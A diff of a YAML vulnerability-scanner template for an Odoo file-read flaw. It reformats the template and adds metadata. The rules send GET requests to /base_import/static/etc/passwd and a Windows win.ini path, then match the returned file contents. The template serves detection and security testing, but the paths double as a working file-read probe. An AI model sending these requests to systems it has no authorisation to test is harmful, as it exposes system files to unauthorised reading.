@@ -1,20 +1,23 @@
 id: odoo-file-read
 
 info:
-    name: Odoo file read
-    author: amos1
-    severity: high
+  name: Odoo file read
+  author: amos1
+  severity: high
+  description: |-
+    Odoo file read vulnerability.
+  tags: odoo,fileread
+  created: 2024/06/25
 
 rules:
-    linux0:
-        request:
-            method: GET
-            path: /base_import/static/etc/passwd
-        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-    win0:
-        request:
-            method: GET
-            path: /base_import/static/c:/windows/win.ini
-        expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
+  linux0:
+    request:
+      method: GET
+      path: /base_import/static/etc/passwd
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  win0:
+    request:
+      method: GET
+      path: /base_import/static/c:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"for 16-bit app support")
 expression: win0() || linux0()
-
